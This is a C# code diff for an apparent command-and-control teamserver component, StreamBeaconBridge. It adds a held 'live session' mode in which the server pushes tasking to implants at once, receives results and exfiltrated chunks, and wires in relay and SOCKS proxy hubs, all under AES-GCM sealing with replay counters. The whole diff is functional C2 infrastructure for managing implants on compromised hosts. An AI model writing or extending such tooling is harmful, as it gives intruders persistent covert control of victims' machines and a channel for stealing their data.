@@ -74,6 +74,15 @@ internal sealed class StreamBeaconBridge
     private readonly IPayloadStore _payloads;
     private readonly EnvelopeCheckInKeys _checkInKeys;
     private readonly ILogger<StreamBeaconBridge> _logger;
+    private readonly BeaconSessionRunner _runner;
+
+    // The handshake capability that switches a connection from the poll
+    // exchange to the held live session (architecture.md Sec 8, the socket
+    // family's stream mode): the implant's stream-mode client advertises it,
+    // the poll client does not, and an older server ignores it -- the extra
+    // advertisement reads as an unknown capability, so an old teamserver
+    // serves the connection as an ordinary poll check-in.
+    public const string LiveSessionCapability = "channels.live";
 
     public StreamBeaconBridge(
         HandshakeService handshake,
@@ -88,6 +97,10 @@ internal sealed class StreamBeaconBridge
         IStagerTokenService tokens,
         IPayloadStore payloads,
         EnvelopeCheckInKeys checkInKeys,
+        ITaskDispatchWake wake,
+        LiveChannelHub channels,
+        TaskRelayHub relays,
+        SocksProxyHub socks,
         ILogger<StreamBeaconBridge> logger)
     {
         _handshake = handshake;
@@ -103,13 +116,20 @@ internal sealed class StreamBeaconBridge
         _payloads = payloads;
         _checkInKeys = checkInKeys;
         _logger = logger;
+        _runner = new BeaconSessionRunner(
+            sessions, tasks, clock, wake, channels, degraded, relays, socks, ingest, tasking);
     }
 
     /// <summary>
-    /// Handles one connection as one check-in and closes it. Every failure --
-    /// a malformed message, a vanished client, a refused handshake answered
+    /// Handles one connection in the shape its handshake advertises: the
+    /// ordinary poll exchange -- one check-in, then closed, the next cycle
+    /// reconnecting -- or, when the handshake advertises
+    /// <see cref="LiveSessionCapability"/>, the held live session the stream
+    /// modes run (server-push tasking, live channels). Every failure -- a
+    /// malformed message, a vanished client, a refused handshake answered
     /// with a bare handshake response -- ends the connection; the next
-    /// check-in reconnects, the poll cadence implants already keep.
+    /// check-in reconnects, the cadence the poll shape keeps and the stream
+    /// shape's reconnects borrow.
     /// </summary>
     public async Task HandleCheckInAsync(Stream stream, Listener listener, CancellationToken stoppingToken)
     {
@@ -217,6 +237,44 @@ internal sealed class StreamBeaconBridge
                 return;
             }
 
+            // The live session (the stream mode's advertisement): the opening
+            // exchange ends here -- the handshake response rides as its own
+            // message, and the shared session runner holds the connection,
+            // pushing tasking the moment it is queued and draining result
+            // frames as they cross (architecture.md Sec 8, the same runner
+            // the gRPC stream, the WebSocket beacon, and the QUIC session
+            // run). The runner runs under the listener's own lifetime: the
+            // check-in timeout above bounds the opening exchange, not a held
+            // session. Sealing rides the same per-message counter discipline
+            // the poll exchange carries: every inbound message is a fresh
+            // counter over the check-in purpose tag, every outbound frame
+            // leaves sealed under the response tag when the connection
+            // opened sealed.
+            if (session.Capabilities.Contains(LiveSessionCapability))
+            {
+                await RespondAsync(stream, response, sealedKey, isSealed, stoppingToken);
+                var livePending = new Queue<Frame>(frames.Skip(1));
+                await _runner.RunAsync(
+                    session,
+                    async liveToken =>
+                    {
+                        while (livePending.Count == 0)
+                        {
+                            var message = await TryReadLiveMessageAsync(
+                                stream, implantId, sealedKey, isSealed, liveToken);
+                            if (message is null)
+                                throw new EndOfStreamException();
+                            foreach (var frame in message)
+                                livePending.Enqueue(frame);
+                        }
+                        return livePending.Dequeue();
+                    },
+                    (frame, liveToken) => WriteLiveFrameAsync(stream, frame, sealedKey, isSealed, liveToken),
+                    stoppingToken,
+                    carrier: "pipe");
+                return;
+            }
+
             var outbound = new List<Frame> { HandshakeFrame(response) };
 
             // Ingest the request's remaining frames (results, exfil chunks,
@@ -296,6 +354,73 @@ internal sealed class StreamBeaconBridge
             // response write failed stays claimed for its result -- the same
             // retransmission tolerance the envelope carries.
         }
+    }
+
+    // One live-session message in: the framed body, or the same counter-
+    // covered sealed shape every check-in body carries (a fresh counter per
+    // message, the floor turned by the same ledger the poll exchange uses).
+    // Null drops the connection -- an unsealable or malformed body is the
+    // refused cycle, not a negotiated one.
+    private async Task<List<Frame>?> TryReadLiveMessageAsync(
+        Stream stream,
+        ImplantId implantId,
+        (Guid KeyId, byte[] Key) sealedKey,
+        bool isSealed,
+        CancellationToken cancellationToken)
+    {
+        byte[] body;
+        try
+        {
+            body = await StreamCheckInFraming.ReadMessageAsync(stream, cancellationToken);
+        }
+        catch (Exception ex) when (ex is IOException or OperationCanceledException)
+        {
+            return null;
+        }
+
+        if (!isSealed)
+        {
+            try
+            {
+                return EnvelopeFraming.Parse(body);
+            }
+            catch (EnvelopeFramingException)
+            {
+                return null;
+            }
+        }
+
+        if (EnvelopeBeaconCheckIn.TryReadSealedKeyId(body, out var sealedText) is not { } keyId
+            || keyId != sealedKey.KeyId)
+            return null;
+        var plain = AesGcmEnvelope.TryUnwrap(sealedText, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.CheckInRequestAad);
+        if (plain is null || plain.Length < 8)
+            return null;
+        var counter = System.Buffers.Binary.BinaryPrimitives.ReadInt64BigEndian(plain);
+        if (!_checkInKeys.Accept(implantId, counter))
+            return null;
+        try
+        {
+            return EnvelopeFraming.Parse(plain[8..]);
+        }
+        catch (EnvelopeFramingException)
+        {
+            return null;
+        }
+    }
+
+    // One live-session frame out: its own message, sealed under the response
+    // purpose tag when the connection opened sealed -- the runner's one
+    // frame per message, the QUIC session's own shape.
+    private static async Task WriteLiveFrameAsync(
+        Stream stream, Frame frame, (Guid KeyId, byte[] Key) sealedKey, bool isSealed,
+        CancellationToken cancellationToken)
+    {
+        var body = EnvelopeFraming.Encode(new[] { frame });
+        if (isSealed)
+            body = System.Text.Encoding.UTF8.GetBytes(AesGcmEnvelope.Wrap(
+                body, sealedKey.KeyId, sealedKey.Key, AesGcmEnvelope.CheckInResponseAad));
+        await StreamCheckInFraming.WriteMessageAsync(stream, body, cancellationToken);
     }
 
     // One response message out: the framed body, or the same body sealed
